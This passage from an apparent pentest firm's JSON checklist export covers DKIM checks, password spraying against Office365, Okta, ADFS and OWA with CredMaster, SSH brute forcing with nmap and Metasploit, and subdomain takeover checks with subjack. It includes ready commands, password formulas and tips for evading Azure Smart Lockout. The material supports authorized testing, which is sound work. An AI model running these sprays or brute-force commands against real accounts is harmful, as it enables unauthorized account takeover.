found)\n;; global options: +cmd\n;; Got answer:\n;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 52638\n;; flags: qr rd ra ad; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 1232\n;; QUESTION SECTION:\n;VRSN._domainkey.verisign.com.  IN      TXT\n\n<strong>;; ANSWER SECTION:\n</strong><strong><span style=\"color: #DB2719\">VRSN._domainkey.verisign.com. 900 IN    TXT     &quot;v=DKIM1; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArGA05xRUv76X9YLzkPzPeilbCvyF/RctsgvpHYoJAMX94gWuJ+UE3rGLmIkrRAayZrDNUqEf3wBsTrilDEoJa2YZz1DbNUe5j657cpjf+rGGaMbs40BqEbnWq1eKOgXT1VcxnwS1UWO+EUV3S/s/+WVYz9TR+Jkjkc9gtLgKm4btf1O3hzeyZkw2iqWyytYvR3bWF699&quot; &quot;KMGbCxsrMgNDZ9U/7ddnY5Z8WD6TplDs9UM/oduzEG+JAH8jUEJqI4YRIHPN+iQGRQnVhAMRD7wJBkeZZUTWwvLTU08oWCXHRAiRw9Xlsfg0xVFBjwnAx8KtQcyMzZEwVCuq/POBp5I6MQIDAQAB;&quot;</span></strong>\n\n;; Query time: 88 msec\n;; SERVER: 1.1.1.1&#35;53(1.1.1.1)\n;; WHEN: Mon Oct 05 16:20:18 CDT 2020\n;; MSG SIZE  rcvd: 475</code></pre><p>Look for the DKIM TXT record to come back in the DNS response. If the client doesn't use DKIM, create a finding for it.</p><p>If you do not have emails from the client to inspect headers from, try to determine the mail provider through MX records and use a common selector for the provider. Below are some common selectors for a few email providers:</p><p><strong>Google</strong></p><p>    google</p><p><strong>Microsoft</strong></p><p>    selector1</p><p>    selector2</p><p><strong>Everlytic</strong></p><p>    everlytickey1</p><p>    everlytickey2</p><p>    eversrv (OLD selector)</p><p><strong>MailChimp / Mandrill</strong></p><p>    k1</p><p><strong>Global Micro </strong></p><p>    mxvault</p><p><strong>Hetzner</strong></p><p>    dkim</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17073304,
							"uid": "56d1636e-ce09-4fd4-97fd-fb0093b67d0d",
							"name": "Weak Configuration - DNS - DKIM Record Not Set",
							"description": "<p>Domain Keys Identified Mail (DKIM) records hold the public keys for the validation of an email header signature. The sending server is typically configured to sign outbound messages with the matching private key. DMARC relies on and takes the configured action on incoming emails if they fail DKIM or SPF checks.</p>",
							"severityId": 1,
							"businessImpact": "<p>Domains without DKIM records may be prone to email data tampering by third parties.</p>",
							"sourceIdentifier": "M:56d1636e-ce09-4fd4-97fd-fb0093b67d0d",
							"verificationInstructions": "<p><strong>Running on multiple domains</strong></p><pre><code>cat main_domains.txt | xargs -I % sh -c &quot;echo %;dig @1.1.1.1 txt selector1._domainkey.% +short;echo&quot;</code></pre>",
							"references": null,
							"exploitInstructions": null,
							"remediationInstructions": "<p>Publish a CNAME DKIM DNS record for the affected domains.</p>"
						},
						"ordinal": 2,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "4078c258-ff88-4510-9cab-a57e91b0c775",
						"name": "Identify Vulnerabilities Missed by Scanning (Dynamic)",
						"instructions": "<p><span style=\"color: red\"><strong>Mark this task as vulnerable to add checklist items for manual checks of known high value vulnerabilities, which are commonly missed by automation.</strong></span></p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 5,
						"commentsCount": 0,
						"hasLinkedFinding": false
					}
				],
				"ordinal": 12,
				"collapsed": true
			},
			{
				"uid": "32003df7-ddf0-479a-9418-ae214281025a",
				"name": "Vulnerability Enumeration: Dictionary Attacks",
				"description": "The goal of this group of tasks is to combine the Active Directory domain information, usernames, software information, and service fingerprinting information from earlier phases and leverage them to guess valid passwords.",
				"type": 1,
				"tasks": [
					{
						"uid": "9cc7b44f-d4dd-456f-a670-f8e87b746365",
						"name": "Target List - Users",
						"instructions": "<h2>Instructions</h2><p>Build a list of users from enumeration phases to target for password guessing against AD or O365 interfaces.</p><h3>Example</h3><p>Build a target list from the following sources:</p><ul><li><p>Employee Enumeration</p></li><li><p>Company File Enumeration - Docker repositories, Github</p></li><li><p>Web Applications - Hard coded credentials</p></li><li><p>Statistically Likely Usernames - https://github.com/insidetrust/statistically-likely-usernames</p></li></ul><p>Validate usernames using either trevorspray or CredMaster before performing password sprays.</p><ul><li><p>https://github.com/blacklanternsecurity/TREVORspray</p></li><li><p>https://github.com/knavesec/CredMaster</p></li></ul>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": true,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 0,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "0a5c7631-f1f9-44db-a6c2-79c89a0d75b6",
						"name": "Password Guessing - Employee Identity Provider (Active Directory, etc.)",
						"instructions": "<h2>Instructions</h2><p>Perform password guessing against Active Directory endpoints.</p><h3><strong>Testing Guidance</strong></h3><p>- Ask the client for their Active Directory password policy and review it prior to performing password spraying. Tailor the tool arguments as needed to ensure users are not being locked out. Treat clients with <em>Account lockout duration = 0</em> with special care since this means that if a user is locked, an admin must manually unlock it.</p><p>- Prior to spraying, obtain a list of potential users by completing the Reconnaissance: Employees section of the checklist.</p><p>- Make sure to use the correct domain when spraying.</p><p>- Test no more than two passwords per user per hour, or less depending on the organization's password policy.</p><h3><strong>Passwords to Use</strong></h3><p>Below is a list of password formulas that should be used during initial password guessing.</p><p>1.) Season year variations</p><p>You may need to try multiple years or seasons depending on when the test is executed. Alternatively, the month can also be used.</p><h3>Examples:</h3><pre><code>Winter18! \nWinter2018!</code></pre><p>2.) Company name variations</p><p>In some cases company abbreviations are also used in passwords, or the industry.</p><h3>Examples:</h3><pre><code>Company12, \nCompany12!\nCompanyBank!\nCompanybank12</code></pre><p>3.) Variations  of password commonly found during engagements.</p><h3>Examples:</h3><pre><code>Abc12345\nPassword1</code></pre><p>4.) Username as password.</p><p>5.) Blank password.</p><h3><strong>Tools</strong></h3><p><strong>CredMaster (https://github.com/knavesec/CredMaster)</strong></p><p><strong><em>General Information:</em></strong></p><p>CredMaster is the preferred tool for most password spraying scenarios. It contains a number of plugins that target different types of endpoints. It uses AWS Amazon API Gateway to randomize and rotate the origin IPs of the spraying traffic, making it more difficult for things like Azure Smart Lockout and other throttling detection engines to spot the password spray. </p><p>Some initial setup is required:</p><p>1. Create an IAM user in NetSPI's Services AWS account</p><p>2. Add the user to the ProxyGroup group</p><p>3. Generate an API key for the user and save the access key + secret access key in PasswordState</p><p>Once AWS API keys have been generated, they can be used on the command line when executing the tool.</p><p><strong><em>Plugin Information</em></strong></p><p>Suggested plugin commands are shown below, but the latest plugin information can always be obtained here: <a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://github.com/knavesec/CredMaster/wiki/Plugin-Overview\">https://github.com/knavesec/CredMaster/wiki/Plugin-Overview</a></p><p>To help determine which plugins can be used, run the AADInternals command <code>Invoke-AADIntReconAsOutsider -Domain \"&lt;emailDomain&gt;\" -GetRelayingParties | Format-Table</code> on the email domain to see if the domain is Managed or Federated, and then select a module from CredMaster's options accordingly. A suitable module may not exist depending on the IdP that is being used by the email domain, so CredMaster may not work in all cases. In those cases, it may be possible to use something like Burp Intruder instead to perform the password spraying, however additional investigation would be required by the consultant to make that determination.</p><p>MSOL - Microsoft Online</p><ul><li><p>Sprays managed Microsoft Online instances like Azure or a managed Office365 setup</p></li></ul><ul><li><p> Only for managed instances (not Federated)</p></li></ul><ul><li><p> Azure Smart Lockout is enabled by default for all P1 and higher subscription tiers. </p></li></ul><ul><li><p><span style=\"color: red\"><strong>Best Practice to avoid Smart Lockout as long as possible is to spread out the regions to as many IPs as possible, run one password at a time, let the regions close, wait for the next spray window, and manually run another password through the command.</strong></span></p></li><li><p><span style=\"color: red\"><strong>MORE TESTING IS BEING DONE ON SMART LOCKOUT EVASION -- STAY TUNED.</strong></span></p></li></ul><p>- <strong>Suggested command:</strong></p><pre><code>python3 credmaster.py --access_key {aws-access-key} --secret_access_key {aws-secret-access-key} --plugin msol -u {username-file} -p {password-file} -a useragents.txt -o {output-file} -t 15 -j 120 -m 30 --header \"X-NetSPI-ExPen: expen.support@netspi.com\"</code></pre><p><em>O365Enum</em> <em>- Office365 User Enum</em></p><p>- Enumerates users on Managed Office365 instances using the \"login.microsoft.com\" URL method</p><p>- The script warns if throttling is detected</p><p>- Suggested command:</p><pre><code>python3 credmaster.py --access_key {aws-access-key} --secret_access_key {aws-secret-access-key} --plugin o365enum -u {username-file} -a useragents.txt -o {output-file} --header \"X-NetSPI-ExPen: expen.support@netspi.com\"</code></pre><p><em>GmailEnum- Gmail User Enumeration</em></p><p>- Enumerates users on GMail GSuite instances</p><p>- Suggested command:</p><pre><code>python3 credmaster.py --access_key {aws-access-key} --secret_access_key {aws-secret-access-key} --plugin gmailenum -u {username-file} -a useragents.txt -o {output-file} --header \"X-NetSPI-ExPen: expen.support@netspi.com\"</code></pre><p><em>OWA - Outlook Web Access</em></p><p>- Sprays an organization's on-prem OWA login portal</p><p>- Requires one additional argument, <code>--url</code></p><p>- On-prem OWA doesn't have any throttle detection/prevention, but lockouts can still occur</p><p>- Suggested command:</p><pre><code>python3 credmaster.py --plugin owa --url https://{domain} -u {username-file} -p {password-file} -a useragents.txt -o {output-file} -t 15 -d 60 --passwordsperdelay 1 --header \"X-NetSPI-ExPen: expen.support@netspi.com\"</code></pre><p><em>EWS - Exchange Web Services </em></p><p>- Sprays an organization's on-prem EWS login portal</p><p>- Requires one additional argument, <code>--url</code></p><p>- On-prem EWS doesn't have any throttle detection/prevention, but lockouts can still occur</p><p>- Suggested command:</p><pre><code>python3 credmaster.py --plugin ews --url https://{domain} -u {username-file} -p {password-file} -a useragents.txt -o {output-file} -t 15 -d 60 --passwordsperdelay 1 --header \"X-NetSPI-ExPen: expen.support@netspi.com\"</code></pre><p><em>ADFS - Active Directory Federation Services</em></p><p>- Sprays on-prem ADFS instances using the \"/adfs/ls/\" method.</p><p>- Requires one additional argument, --url</p><p>- Can employ Smart Lockout for password spraying</p><p>- Suggested command:</p><pre><code>python3 credmaster.py --access_key {aws-access-key} --secret_access_key {aws-secret-access-key} --plugin adfs --url https://{adfs-domain} -u {username-file} -p {password-file} -a useragents.txt -o {output-file} -t 5 -j 20 -m 10 -d 60 --passwordsperdelay 1 --header \"X-NetSPI-ExPen: expen.support@netspi.com\"</code></pre><p><em>AzureSSO - Azure AD Seamless SSO Endpoint</em></p><p>- Sprays Azure AD instances using the \"autologon.microsoftazuread-sso.com\" URL method</p><p>- Requires one additional argument, <code>--domain</code>, that specifies the target Tenant domain</p><p>- Azure Smart Lockout may apply to rate limit queries</p><p>- Tool should notify you if Smart Lockout is detected </p><p>- Suggested command:</p><pre><code>python3 credmaster.py --access_key {aws-access-key} --secret_access_key {aws-secret-access-key} --plugin azuresso --domain {tenant-domain} -u {username-file} -p {password-file} -a useragents.txt -o {output-file} -t 5 -j 20 -m 10 -d 60 --passwordsperdelay 1 --header \"X-NetSPI-ExPen: expen.support@netspi.com\"</code></pre><p><em>Okta - Okta Authentication Portal</em></p><p>- Sprays an organization's Okta login portal</p><p>- Requires one additional argument, <code>--url</code></p><p>- Prone to throttling, don't use more than a single thread</p><p>- Suggested command:</p><pre><code>python3 credmaster.py --access_key {aws-access-key} --secret_access_key {aws-secret-access-key} --plugin okta --url https://{domain}.okta.com -u {username-file} -p {password-file} -a useragents.txt -o {output-file} -t 1 -j 60 -m 30 -d 60 --passwordsperdelay 1 --header \"X-NetSPI-ExPen: expen.support@netspi.com\"</code></pre><p><strong>TREVORSpray (https://github.com/blacklanternsecurity/TREVORspray)</strong></p><p>- Recon tools + Cisco AnyConnect VPN module</p><p><strong>SprayingToolkit (https://github.com/byt3bl33d3r/SprayingToolkit)</strong></p><p>- Lync/Skype for Business + IMAP modules</p><p>- Examples:</p><pre><code>python atomizer.py owa contoso.com --recon\npython atomizer.py owa contoso.com 'Fall2018' emails.txt\npython atomizer.py lync contoso.com 'Fall2018' emails.txt\npython atomizer.py imap contoso.com 'Fall2018' emails.txt</code></pre><p><strong>CredKing (https://github.com/ustayready/CredKing)</strong></p><p>- GMail module</p><h3><strong>Tools for Validating Conditional Access Policies + MFA Implementations</strong></h3><p>https://github.com/dafthack/MFASweep</p><p>https://github.com/thalpius/Microsoft-Azure-AD-Conditional-Access-Validator</p><h2><strong>Reporting Requirements</strong></h2><p>Show the user enumeration method, the Active Directory domain enumeration method, and the successful password guessing.</p><p><strong>Please include the interface you guessed against, tool used, passwords used, and approximate time stamps as comments to this checklist item, e.g.</strong></p><pre><code><strong>12/21/20 @ 2:55PM\nOffice365 via Atomizer\nNetSPI2020!\nNetSPI20!</strong></code></pre><p><strong>Please also attach your list of usernames to the Documents section without showing in Track.</strong></p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 1,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "17d0e28a-2457-4445-9416-4de129e076b6",
						"name": "Password Guessing - Management Protocols",
						"instructions": "<h2><strong>Instructions</strong></h2><p>Guess passwords for users over common management protocols.  Below is the prioritized approach you should use. Please note that should be done as time allows.</p><p>1. Guess defaults</p><p>2. Dictionary attack using known usernames for device using Fuzzdb or rockyou dictionaries. Also consider using common keyboard walks.</p><p>3. Dictionary attack using common usernames and passwords. For example, test, admin, and administrator.</p><h3><strong>Example protocols:</strong></h3><p>FTP</p><p>LDAP</p><p>NFS</p><p>RDP</p><p>RSYNC</p><p>SFTP</p><p>SMB</p><p>SSH</p><p>TELNET</p><h2><strong>Report Requirements</strong></h2><p>Show the password guessing and sucessful login.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 2,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "32fb4751-37d1-499b-a074-233786c154f1",
						"name": "Password Guessing - Web Portals",
						"instructions": "<h2><strong>Instructions</strong></h2><p>Note: Review vulnerability scan results and web scraping results for potential targets.</p><p>Only test application credentials. DO NOT perform brute force dictionary attacks against domain credentials.</p><p>Do this as time allows using the prioritized approach below:</p><p>1. Target web based management interfaces first. Attempt <strong>known user names </strong>with the rockyou.txt or fuzzdb dictionaries using Burp. Also consider using common keyboard walks. They can be generated with kwprocessor.</p><p>2. If that fails, attempt common user names like &quot;admin&quot;, &quot;administrator&quot;, and &quot;test&quot;, and the same dictionaries.</p><p>3. If the application leaks information about users you maybe able to infer usernames. If not, just move on.</p><p>Use your best judgement :)</p><p><strong>Important Note</strong></p><p>After you guess credentials, please <strong>do not perform authenticated</strong> scanning of of web applications. Most of those web applications are production and simply crawling some of them can have unintended consequences.</p><h2><strong>Reporting Requirements</strong></h2><p>Show screens of each step in the process and the successful login.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 3,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "f94e0d04-c2ef-4598-9c2f-e05763c3afd5",
						"name": "Password Guessing - SSH",
						"instructions": "<p>Execute this if SSH services are identified externally which allow password authentication.</p><h2>Instructions</h2><p>1. Attempt to fingerprint the device hosting SSH.</p><p>2. Identify default credentials, and test for those first.</p><p>3. If no default credentials can be identified attempt to use common username that may be configured with weak password.</p><p>4. If a password can be guessed then add this finding. </p><p>5. If a password can be guessed then add a verification showing the guessing process and successful login. </p><h2>Variation: SSH Password Guessing with Nmap and Metasploit (Updated 11/7/2024)</h2><p>Perform common dictionary attacks against SSH Servers to identify weak passwords.  This variation require Kali Linux, or a system with nmap and Metasploit installed.  However, it could be executed with other tools.  </p><p>1. Enumerate SSH servers if required.  Also, consider finger printing other service to identify the specific device and if default passwords exist. Download the SecList SSH creds file.</p><p>Note: It can be helpful to try other lists or try system/service enumeration to attempt to identify default credentials. We recommend against trying extremely long lists. </p><pre><code><em># Conduct Nmap scan to identify open SSH ports\n</em><strong>nmap -Pn -sT -p 22 -iL targets.txt -oA ssh-servers &gt; /dev/null \n\nif grep -q open ssh-servers.gnmap; then\n  num=$(grep open ssh-servers.gnmap | wc -l)\n  echo \"$num Open SSH ports found - adding to /tmp/ssh-servers.txt and downloading default wordlist\"</strong>\n\n  # Extract open SSH ports and add to a file.\n<strong>  grep open ssh-servers.gnmap | cut -d \" \" -f 2 &gt; /tmp/ssh-servers.txt</strong>\n\n  # Download the SSH default password list from seclists.\n<strong>  wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt -O /tmp/sshPass.txt </strong>\n\n  # Set the proper Metasploit formatting on the SecList file.\n<strong>  sed -i  's/:/ /' /tmp/sshPass.txt \nelse\n  echo \"No open SSH ports found.\"\nfi</strong></code></pre><p>2. Conduct a brute force attack with Metasploit. </p><pre><code><strong>msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_login ; set RHOSTS file:/tmp/ssh-servers.txt ; set USERPASS_FILE /tmp/sshPass.txt ; set USER_AS_PASS true ; set BLANK_PASSWORDS true ; set THREADS 50 ; spool ssh-defaultpass.txt ; run ; exit'</strong></code></pre>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 5051126,
							"uid": "1fbbed97-4345-e211-89eb-001e4f120032",
							"name": "Weak or Default Password - SSH",
							"description": "<p>At least one account is configured with a weak or default password on the remote SSH server. Any password that is based on a dictionary word or can be easily guessed is considered to be weak. Default passwords are initially set by the software or device vendor when a product is sold. Both weak and default passwords are commonly targeted during brute force password attacks. Default and weak passwords are commonly found in environments where a password policy does not exist, or is not being enforced.</p>",
							"severityId": 4,
							"businessImpact": "<p>An attacker can execute arbitrary commands on the remote host with administrative privileges. This could lead to the complete compromise of the confidentiality, integrity, and availability of the target system and its associated resources. This could lead to the exposure of sensitive data and denial of service conditions that prevent legitimate users from accessing the affected system.</p>",
							"sourceIdentifier": "M:1fbbed97-4345-e211-89eb-001e4f120032",
							"verificationInstructions": "<p>Do as time allows.</p><h2>Instructions</h2><p>1. Attempt to fingerprint the device hosting SSH.</p><p>2. Identify default credentials, and test for those first.</p><p>3. If no default credentials can be identified attempt to use common username that may be configured with weak password.</p><p>4. If a password can be guessed then add this finding. </p><p>5. If a password can be guessed then add a verification showing the guessing process and successful login. </p><h2>Variation: SSH Password Guessing with Nmap and Metasploit (Updated 11/7/2024)</h2><p>Perform common dictionary attacks against SSH Servers to identify weak passwords.  This variation require Kali Linux, or a system with nmap and Metasploit installed.  However, it could be executed with other tools.  </p><p>1. Enumerate SSH servers if required.  Also, consider finger printing other service to identify the specific device and if default passwords exist. Download the SecList SSH creds file.</p><p><em>Note: It can be helpful to try other lists or try system/service enumeration to attempt to identify default credentials. We recommend against trying extremely long lists. </em></p><pre><code><em>&#35; Conduct Nmap scan to identify open SSH ports\n</em><strong>nmap -Pn -sT -p 22 -iL targets.txt -oA ssh-servers &gt; /dev/null \n\n</strong><strong>if grep -q open ssh-servers.gnmap; then\n</strong><strong>  num=$(grep open ssh-servers.gnmap | wc -l)\n</strong><strong>  echo &quot;$num Open SSH ports found - adding to /tmp/ssh-servers.txt and downloading default wordlist&quot;</strong>\n\n  &#35; Extract open SSH ports and add to a file.\n<strong>  grep open ssh-servers.gnmap | cut -d &quot; &quot; -f 2 &gt; /tmp/ssh-servers.txt</strong>\n\n  &#35; Download the SSH default password list from seclists.\n<strong>  wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt -O /tmp/sshPass.txt </strong>\n\n  &#35; Set the proper Metasploit formatting on the SecList file.\n<strong>  sed -i  's/:/ /' /tmp/sshPass.txt \n</strong><strong>else\n</strong><strong>  echo &quot;No open SSH ports found.&quot;\n</strong><strong>fi</strong></code></pre><p>2. Conduct a brute force attack with Metasploit. </p><pre><code><strong>msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_login ; set RHOSTS file:/tmp/ssh-servers.txt ; set USERPASS_FILE /tmp/sshPass.txt ; set USER_AS_PASS true ; set BLANK_PASSWORDS true ; set THREADS 50 ; spool ssh-defaultpass.txt ; run ; exit'</strong></code></pre><h2>Variation: SSH Password Guessing with Nmap and Metasploit (Old)</h2><p>Perform common dictionary attacks against SSH Servers to identify weak passwords.  This variation require Kali Linux, or a system with nmap and Metasploit installed.  However, it could be executed with other tools.  </p><p>1. Enumerate SSH servers if required.  Also, consider finger printing other service to identify the specific device and if default passwords exist.</p><pre><code>nmap -Pn -sT -p22 -iL hosts.txt -oA ssh-servers</code></pre><p>2. Create a file called /tmp/test.txt that contain the following. Other word lists can be used, but we advice against using extremely large lists.</p><pre><code>root password\nuser password\nuser1 password\ntest password\napp password\nweb password\ntestuser password\nadmin password\nadmin admin</code></pre><p>3. Attempt to get common users and password with Metasploit.</p><pre><code>msfconsole\nuse  auxiliary/scanner/ssh/ssh_login\nset rhosts file:///tmp/ssh-servers.txt\nset USERPASS_FILE /tmp/test.txt\nset USER_AS_PASS true\nset BLANK_PASSWORDS true\nset rport 22\nset threads 50\nrun</code></pre><p>Note: The  auxiliary/scanner/ssh/ssh_login_pubkey Metasploit can also come in handy.</p><p>4. If a password can be guessed then add this finding. </p>",
							"references": null,
							"exploitInstructions": "",
							"remediationInstructions": "<p>Configure all accounts to use strong passwords. If a strong password policy has not been established, create one using the recommendations below as a guide. Password policies should include the following primary components:</p><ul><li><p>Password minimum length of twelve or more characters</p></li><li><p>Password complexity requirements that require each password contain three of the following: a lower case letter, an upper case letter, a number, a special character</p></li><li><p>Password cannot be the same as the username</p></li><li><p>Password cannot be a dictionary word</p></li></ul>"
						},
						"ordinal": 4,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "65bbb588-9f88-45d7-86c5-29512c611b42",
						"name": "Additional OPTIONAL or PENDING items",
						"instructions": "<p>Additional options are available which may still be pending further review or testing; or may have account or API access requirements that has not been built into process yet. Also, these optional dynamic checklists may include testing instructions related to older technologies or data sets that are not often relevant in modern day-to-day process.<br><br>To add these items to the checklist, mark this task as vulnerable.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 5,
						"commentsCount": 0,
						"hasLinkedFinding": false
					}
				],
				"ordinal": 13,
				"collapsed": true
			},
			{
				"uid": "5de27cd9-28d0-42f3-99eb-496f0ef259ee",
				"name": "Resource Hijacking",
				"description": "Hijacking resources such as IPs, Domains, Subdomains, or Namespace to impersonate a resource for various attacks.",
				"type": 2,
				"tasks": [
					{
						"uid": "b4d9879a-ef33-41c2-b32a-31d3cc4faada",
						"name": "Subdomain Hijacking - Subjack [ExPowerPen]",
						"instructions": "<h2><strong>Instructions</strong></h2><p>Review subdomains for potential hijacking.</p><h2><strong>Variation: subjack</strong></h2><p>Run subjack against <strong>ALL </strong>discovered subdomains and manually review vulnerable results. <br><strong>USE YOUR BEST JUDGEMENT IN WHETHER DISCOVERED SUBDOMAINS SEEM TO BELONG TO THE CLIENT.</strong></p><p>1. install go</p><pre><code>sudo apt install golang-go</code></pre><p>2. Install subjack</p><pre><code>go install github.com/haccer/subjack@latest</code></pre><p>3. Download fingerprints.json</p><pre><code>wget https://raw.githubusercontent.com/haccer/subjack/master/fingerprints.json</code></pre><p>4. Run subjack</p><pre><code>subjack -w subdomain-list.txt -v -a -ssl -c fingerprints.json </code></pre><p>1. install go</p><pre><code>sudo apt install golang-go</code></pre><p>2. Install subjack</p><pre><code>go install github.com/haccer/subjack@latest</code></pre><p>3. Download fingerprints.json</p><pre><code>wget https://raw.githubusercontent.com/haccer/subjack/master/fingerprints.json</code></pre><p>4. Run subjack</p><pre><code>subjack -w subdomain-list.txt -v -a -ssl -c fingerprints.json</code></pre><h2>Variation: Manual</h2><p>1. Review enumerated domains and subdomains CNAME records.</p><p>2. Review in-scope domains found in websites.</p><p>3. Review hosting provider configurations.</p><pre><code>https://github.com/edoverflow/can-i-take-over-xyz</code></pre><p>Use dig and host to identify dangling CNAME entries:</p><pre><code>dig CNAME +short subdomain.domain.com\ncname-record.trafficmanager.net.\n\nhost subdomain.domain.com\nHost subdomain.domain.com not found: 3(NXDOMAIN)</code></pre><h2></h2>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17073303,
							"uid": "66fcfbaf-438b-4e63-b7fb-edfca444d3cf",
							"name": "Weak Configuration - Potential Subdomain Takeover",
							"description": "<p>Subdomain takeover attacks allow an attacker to take control over a subdomain of a target domain. If the subdomain has a canonical name (CNAME) record listed in DNS, and that CNAME record is not currently registered, an attacker can potentially register the CNAME domain themselves. These issues are often related to cloud resources that may have been moved or deleted, creating hanging CNAME records.</p>",
							"severityId": 3,
							"businessImpact": "<p>A subdomain takeover can allow an attacker to host content on a valid subdomain. This can allow the attacker to inject content into other domains that use the subdomain. The attacker can also use the subdomain for malicious purposes, including intercepting and reading cookies, performing XSS attacks, and circumventing content security policies for the target domain.</p><p>Finally, the subdomain could be used to masquerade as a legitimate site or resource from the parent domain. This can be leveraged with social engineering attacks to attack users that believe they are interacting with the parent domain.</p>",
							"sourceIdentifier": "M:66fcfbaf-438b-4e63-b7fb-edfca444d3cf",
							"verificationInstructions": "<h2>Overview</h2><p>Perform subdomain enumeration on in-scope root domain names and check to see if any subdomains are vulnerable to subdomain takeover.</p><p>Useful tools:</p><ul><li><p><a href='https://github.com/haccer/subjack'>subjack</a></p></li><li><p><a href='https://github.com/EdOverflow/can-i-take-over-xyz'>can-i-take-over-xyz</a> </p></li></ul><h2>Process</h2><ol><li><p>Enumerate subdomains using NetSPI's standard process</p></li><ol><li><p>The most updated process can be found in the ExPen checklist</p></li></ol><li><p>Install subjack using the instructions <a href='https://github.com/haccer/subjack#installing'>here</a></p></li><ol><li><p>Ensure that subjack is working correctly</p></li><li><pre><code>subjack -d example.com</code></pre></li><ol><li><p>Run the commands below if you get the error message: <code>2023/02/16 17:17:09 open /src/github.com/haccer/subjack/fingerprints.json: no such file or directory</code></li><ol><li><pre><code>updatedb</code></pre></li><li><pre><code>locate fingerprints.json</code></pre></li><li><p>Copy the path from the above output and append to the subjack command below: <code>-c {path_from_locate_command}</code></li></ol></ol></ol><li><p>Scan the list of identified subdomains for takeover using subjack</p></li><ol><li><pre><code>subjack -a -o subjack_output.txt -v -w {subdomain_list}</code></pre></li></ol><li><p>Review the output to determine if any hosts are vulnerable:</p></li><ol><li><pre><code>grep -vF '[Not Vulnerable]' subjack_output.txt</code></pre></li></ol><li><p>If a host is vulnerable, reference <a href='https://github.com/EdOverflow/can-i-take-over-xyz'>can-i-take-over-xyz</a> for instructions/details on how to exploit</p></li></ol>",
							"references": "<ul><li>https://learn.microsoft.com/en-us/azure/security/fundamentals/subdomain-takeover</li><li>https://developer.mozilla.org/en-US/docs/Web/Security/Subdomain_takeovers</li></ul>",
							"exploitInstructions": null,
							"remediationInstructions": "<p>Consider the recommendations below.</p><ul><li><p>If the CNAME entry that allows for the takeover is not needed, remove it from the subdomain's DNS records.</p></li><li><p>If the CNAME entry is still available to be registered (it hasn't been taken over yet) and is required, register the CNAME through DNS or whatever service, such as AWS or Azure, it uses.</p></li><li><p>Create processes and procedures to ensure that &quot;dangling CNAME&quot; records do not occur. When a virtual host is deprovisioned, make sure that any DNS records associated with that host are removed as well.</p></li></ul>"
						},
						"ordinal": 0,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "59ea8a3f-2f03-4283-a6ac-b6e1d0502207",
						"name": "Additional OPTIONAL or PENDING items",
						"instructions": "<p>Additional options are available which may still be pending further review or testing; or may have account or API access requirements that has not been built into process yet. Also, these optional dynamic checklists may include testing instructions related to older technologies or data sets that are not often relevant in modern day-to-day process.<br><br>To add these items to the checklist, mark this task as vulnerable.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 1,
						"commentsCount": 0,
						"hasLinkedFinding": false
					}
				],
				"ordinal": 14,
				"collapsed": true
			},
			{
				"uid": "6563bff6-28d8-43d2-b70b-dadbb8829b93",
				"name": "Exploitation Guidance",
				"description": "This group of tasks is intended to provide basic guidance during exploitation.",
				"type": 1,
				"tasks": [
					{
						"uid": "ed8e685e-08d5-4c90-90d6-a10cd09defec",
						"name": "Read Access Guidance",
